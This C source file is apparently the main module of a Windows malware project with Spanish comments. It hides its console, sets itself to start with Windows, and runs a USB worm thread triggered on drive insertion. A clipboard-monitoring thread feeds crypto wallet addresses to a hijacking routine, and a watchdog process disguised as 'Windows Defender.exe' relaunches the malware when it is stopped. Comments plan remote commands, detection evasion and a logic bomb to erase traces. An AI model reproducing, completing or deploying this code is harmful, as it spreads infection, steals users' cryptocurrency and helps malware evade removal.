#include <windows.h>
#include <TlHelp32.h>
//#include <pthread.h>//uso de hilos x el standar POSIX
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>//libreria necesaria para listar archivos y carpetas con POSIX
#include <errno.h>//necesaria para la funcion CheckInfectedUSB
#include "cryptocoin.h"
#include "os_check.h"
#include "usb_worm.h"

int addonstart();
void vigiaExterno();
int kk();
LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam);
char szClassName[ ] = "WindowsApp";
DWORD WINAPI RunToDectedUSB(LPVOID LPARAM); /*
                                            este prototipo de funcion es para
                                            correr en un hilo el infector de USB
                                                */
DWORD WINAPI RunToCryptoCoin(LPVOID LPARAM);


int main(int argc, char *argv[]){
    //printf("kk");
    //funcion para ocultar la consola
    FreeConsole();

    if(argc>1){
        //funcion para ocultar la consola
        //FreeConsole();
        //printf("argv[0]=%c\n",argv);
        if(strlen(argv[1])==1){
            printf("lanzando vigia \n");
            vigiaExterno();//su definicion se encuentra en usb_worm.h
            return EXIT_SUCCESS;
        }

         if(strlen(argv[1])==2){
            addonstart();//su definicion se encuentra en usb_worm.h
            printf("download and execute\n");
            return EXIT_SUCCESS;
        }
    }


    //aqui va la funcion de deteccion de doble ejecucion
    //;

    //aqui va la funcion que arranca al vigia
    //;                                                 //la funcion vigia inicia otro proceso
                                                        //completamente separado del proceso padre
                                                        //es decir que no es un hilo oh Thread
                                                        //es un procesa completamente separado
                                                        //el cual, tendra como funcion principal
                                                        //vigilar que el proceso padre exista
                                                        //si no existe lo vuelve a lanzar y el
                                                        //proceso padre vigilara que el proceso
                                                        //vigia exista si no es asi lo vuelde a
                                                        //crear.
    //esto se ejecuta si el programa esta en la usb
    if(RunTimeEnableDirPath()==8){//su definicion se encuentra en usb_worm.h
        printf("solo debo copiarme\n");
        addonstart();//su definicion se encuentra en os_check.h
        OpenDirFake();//su definicion se encuentra en usb_worm.h
        return EXIT_SUCCESS;
    }


    //esto se ejecuta si el usuario abre el programa se inicia con windows
    //y prepara todo para el proximo reinicio
    if(RunTimeEnableNameFile()!=8){//su definicion se encuentra en usb_worm.h
        printf("solo debo copiarme\n");
        addonstart();//su definicion se encuentra en os_check.h
        //OpenDirFake();//su definicion se encuentra en usb_worm.h
        return EXIT_SUCCESS;
    }


    HANDLE MiHilo;                                              //creamos los tipos de datos
    DWORD IdDelHilo;                                            //necesarios para llamar ala
    MiHilo=CreateThread(NULL,0,RunToDectedUSB,NULL,0,&IdDelHilo);//api CreateThread() dicha api
                                                                //es usada para la creacion de
                                                                //hilos desde windows 98 hasta
                                                                //windows 10 hay otras alternativas
                                                                //pero esta es la mas sencilla

    HANDLE MiHilo2;
    DWORD IdDelHilo2;
    MiHilo2=CreateThread(NULL,0,RunToCryptoCoin,NULL,0,&IdDelHilo2);


    //buffer para el portapapeles
    /*
    char *temp_buffer;
    while(1){
        temp_buffer=getclipboard();
        printf("\"%x\"\n",temp_buffer);
        if(((int)temp_buffer)!=1){
            checkcoin(temp_buffer);
            _sleep(2201);
        }
        if(((int)temp_buffer)==1){
            printf("archive or directory\n");
            _sleep(1201);
        }
    }

*/
    //aqui ira la funcion la cual obtiene
    //comandos remotos d lo q deberia
    //realizar el malware x ejemplo si
    //el malware es detectado podemos enviar
    //un comando de desactivacion temporal
    //para pasar desapersividos por 1 dia oh mas
    //oh una bomba logica que borra nuestras huellas


    RunVigiaProcess();
    //funcion para ocultar la consola

    while(1){
        //_sleep(3111);
        printf("programa principal ejecutandose\n");
        Sleep(3111);
    }
    return EXIT_SUCCESS;
}




//esta funcion correra con el hilo
// y de desde ahi lanzaremos la funcion DetectedUSB()
//para que corra en el hilo
DWORD WINAPI RunToDectedUSB(LPVOID LPARAM){
    kk();                      //su definicion se encuentra en usb_worm.h
}

DWORD WINAPI RunToCryptoCoin(LPVOID LPARAM){
    char *temp_buffer;
    while(1){
        temp_buffer=getclipboard();
        printf("\"%x\"\n",temp_buffer);
        if(((int)temp_buffer)!=1){
            checkcoin(temp_buffer);//su definicion se encuentra en cryptocoin.h
            //_sleep(2201);
            Sleep(2201);
        }
        if(((int)temp_buffer)==1){
            printf("archive or directory\n");
            //_sleep(1201);
            Sleep(1211);
        }
    }
}


void vigiaExterno(){
    //en esta funcion listamos los procesos
    //y si no esta listado el proceso
    //lo arrancamos
    //funcion para ocultar la consola
    //FreeConsole();
    wchar_t *Server = L"Windows Defender.exe";
    bool Conectado;
    while(1){
        printf("desde aqui estara ejecutandose el vijia\n");
        Conectado=IsRuningW(Server);
        if(Conectado!=true){
            printf("relanzando malwared\n");

            STARTUPINFO si;
            PROCESS_INFORMATION pi;
            char *lop=((char*)"Windows Defender.exe");
            ZeroMemory(&si,sizeof(si));
            si.cb=sizeof(si);
            ZeroMemory(&pi,sizeof(pi));
            if(!CreateProcess(NULL,lop,NULL,NULL,NULL,NULL,NULL,NULL,&si,&pi)){
                 //error al crear el proceso
                 printf("error\n");
            }
            break;
            //aqui va el codigo para relanzar el malwared.exe
        }
        if(Conectado==true){
            //abrimos un archivo si es igual a 1
            //es señal que si se esta ejecutando el malwared
            //principal
             printf("el malwared se esta ejecutando\n");
             Sleep(15210);
        }


    }

}

//esta funcion es para gestionar los mensajes de windows
LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam){
    switch(message)/* handle the messages */
    {

        case WM_DEVICECHANGE:{
            // detecta cuando se inserta una unidad removible
            if(wParam==0x8000)
                DetectedUSB(hwnd);
                break;
                //MessageBox(hwnd,"8", "Aviso: Se conecto una unidad USB en la etiqueta:",MB_OK | MB_ICONWARNING );
            // detecta cuando se retira una unidad removible
            if(wParam==0x8004)
                //MessageBox(hwnd,"8", "Aviso: Se retiro una unidad USB en la etiqueta:",MB_OK | MB_ICONWARNING );
                break;
        }
        /*
        case WM_LBUTTONUP:{
            MessageBox(hwnd,"has lebantado el lbutton del mouse", "Aviso:",MB_OK | MB_ICONWARNING );
            break;
        }
        */
        case WM_DESTROY:{
            PostQuitMessage (0);/* send a WM_QUIT to the message queue */
            break;
        }
        default:{
            /* for messages that we don't deal with */
            return DefWindowProc (hwnd, message, wParam, lParam);
        }

    }
    return 0;
}
//esta funcion es la encargada de iniciar el handler de messages de WM
int kk(){
    HINSTANCE hThisInstance;
    HINSTANCE hPrevInstance;
    LPSTR lpszArgument;
    int nFunsterStil;
    HWND hwnd;/* This is the handle for our window */
    MSG messages;/* Here messages to the application are saved */
    WNDCLASSEX wincl;/* Data structure for the windowclass */

    /* The Window structure */
    wincl.hInstance=hThisInstance;
    wincl.lpszClassName=szClassName;
    wincl.lpfnWndProc=WindowProcedure;/* This function is called by windows */
    wincl.style=CS_DBLCLKS;/* Catch double-clicks */
    wincl.cbSize=sizeof(WNDCLASSEX);
    /* Use default icon and mouse-pointer*/
    wincl.hIcon=LoadIcon(NULL,IDI_APPLICATION);
    wincl.hIconSm=LoadIcon(NULL,IDI_APPLICATION);
    wincl.hCursor=LoadCursor(NULL,IDC_ARROW);
    wincl.lpszMenuName=NULL;/* No menu */
    wincl.cbClsExtra=0;/*No extra bytes after the window class */
    wincl.cbWndExtra=0;/* structure or the window instance */
    /* Use Windows's default color as the background of the window */
    wincl.hbrBackground=(HBRUSH)COLOR_BACKGROUND;
    /* Register the window class, and if it fails quit the program */
    if(!RegisterClassEx(&wincl))
        return 0;
    /* The class is registered, let's create the program*/
    hwnd=CreateWindowEx(WS_EX_TOOLWINDOW,/* Extended possibilites for variation */
                        szClassName,/*Classname*/
                        "USB-DETECTOR",/* Title Text */
                        WS_OVERLAPPEDWINDOW,/*default window*/
                        CW_USEDEFAULT,/*Windows decides the position */
                        CW_USEDEFAULT,/* where the window ends up on the screen */
                        544,/* The programs width */
                        375,/* and height in pixels */
                        HWND_DESKTOP,/* The window is a child-window to desktop */
                        NULL,/* No menu */
                        hThisInstance,/* Program Instance handler */
                        NULL/* No Window Creation data */);
    /* Make the window visible on the screen */
    ShowWindow (hwnd,/* nFunsterStil*/SW_HIDE);
    /* Coded by SEKTOR From CPH */
    /* Run the message loop. It will run until GetMessage() returns 0 */
    while(GetMessage(&messages,NULL,0,0)){
        /* Translate virtual-key messages into character messages */
        TranslateMessage(&messages);
        /* Send message to WindowProcedure */
        DispatchMessage(&messages);
    }
    /* The program return-value is 0 - The value that PostQuitMessage() gave */
    return messages.wParam;
}
